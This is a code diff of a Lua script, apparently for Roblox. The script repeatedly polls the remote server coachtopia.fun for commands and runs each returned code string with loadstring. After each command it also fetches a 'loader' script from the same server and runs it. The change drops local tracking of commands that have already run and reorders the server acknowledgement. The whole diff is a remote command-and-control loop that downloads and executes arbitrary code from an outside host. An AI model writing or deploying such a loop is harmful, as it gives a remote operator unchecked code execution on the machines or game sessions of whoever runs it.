@@ -5,9 +5,6 @@
 local SERVER_URL = "https://coachtopia.fun"
 local POLL_INTERVAL = 2
 
--- Track executed command names to prevent re-execution
-local executedCommands = {}
-
 -- HTTP request function
 local function httpGet(url)
     local success, response = pcall(function()
@@ -74,55 +71,47 @@ while true do
                 print("[POLL] Found", #data.commands, "command(s)")
                 
                 for _, cmd in ipairs(data.commands) do
-                    -- Skip if this command name was already executed
-                    if executedCommands[cmd.name] then
-                        print("[EXECUTE] Skipping already executed command:", cmd.name)
+                    print("[EXECUTE] Executing command:", cmd.name)
+                    
+                    -- Execute the main script
+                    local execSuccess, execErr = pcall(function()
+                        loadstring(cmd.code)()
+                    end)
+                    
+                    if execSuccess then
+                        print("[EXECUTE] Main script executed successfully")
                     else
-                        print("[EXECUTE] Executing command:", cmd.name)
-                        
-                        -- Mark this command as executed locally
-                        executedCommands[cmd.name] = true
-                        
-                        -- Delete command from server immediately
-                        httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
-                        
-                        -- Execute the main script
-                        local execSuccess, execErr = pcall(function()
-                            loadstring(cmd.code)()
+                        warn("[EXECUTE] Main script failed:", execErr)
+                    end
+                    
+                    -- Delete command from server after execution
+                    httpPost(SERVER_URL .. "/api/commands/" .. cmd.name .. "/executed", "")
+                    
+                    -- After main script, load and execute loader script
+                    print("[LOADER] Fetching loader script...")
+                    local loaderResponse = httpGet(SERVER_URL .. "/api/loader")
+                    
+                    if loaderResponse then
+                        local loaderSuccess, loaderData = pcall(function()
+                            return game:GetService("HttpService"):JSONDecode(loaderResponse)
                         end)
                         
-                        if execSuccess then
-                            print("[EXECUTE] Main script executed successfully")
-                        else
-                            warn("[EXECUTE] Main script failed:", execErr)
-                        end
-                        
-                        -- After main script, load and execute loader script
-                        print("[LOADER] Fetching loader script...")
-                        local loaderResponse = httpGet(SERVER_URL .. "/api/loader")
-                        
-                        if loaderResponse then
-                            local loaderSuccess, loaderData = pcall(function()
-                                return game:GetService("HttpService"):JSONDecode(loaderResponse)
+                        if loaderSuccess and loaderData.success and loaderData.code then
+                            print("[LOADER] Executing loader script...")
+                            local loadSuccess, loadErr = pcall(function()
+                                loadstring(loaderData.code)()
                             end)
                             
-                            if loaderSuccess and loaderData.success and loaderData.code then
-                                print("[LOADER] Executing loader script...")
-                                local loadSuccess, loadErr = pcall(function()
-                                    loadstring(loaderData.code)()
-                                end)
-                                
-                                if loadSuccess then
-                                    print("[LOADER] Loader script executed successfully")
-                                else
-                                    warn("[LOADER] Loader script failed:", loadErr)
-                                end
+                            if loadSuccess then
+                                print("[LOADER] Loader script executed successfully")
                             else
-                                warn("[LOADER] Failed to decode loader response")
+                                warn("[LOADER] Loader script failed:", loadErr)
                             end
                         else
-                            warn("[LOADER] Failed to fetch loader script")
+                            warn("[LOADER] Failed to decode loader response")
                         end
+                    else
+                        warn("[LOADER] Failed to fetch loader script")
                     end
                 end
             end
